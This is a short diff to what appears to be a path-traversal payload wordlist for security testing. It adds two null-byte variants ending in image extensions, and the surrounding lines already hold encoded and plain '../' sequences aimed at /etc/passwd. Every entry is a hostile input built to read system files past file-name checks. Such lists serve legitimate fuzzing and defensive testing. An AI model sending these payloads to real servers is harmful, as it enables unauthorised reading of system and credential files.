@@ -1,6 +1,8 @@
 /etc/passwd
 ..%252f..%252f..%252fetc/passwd
 /var/www/images/../../../etc/passwd
+/var/www/images/../../../etc/passwd%00.png
+/var/www/images/../../../etc/passwd%00.jpg
 ../../../etc/passwd%00.png
 ../../../etc/passwd%00.jpg
 /.../.../.../.../.../
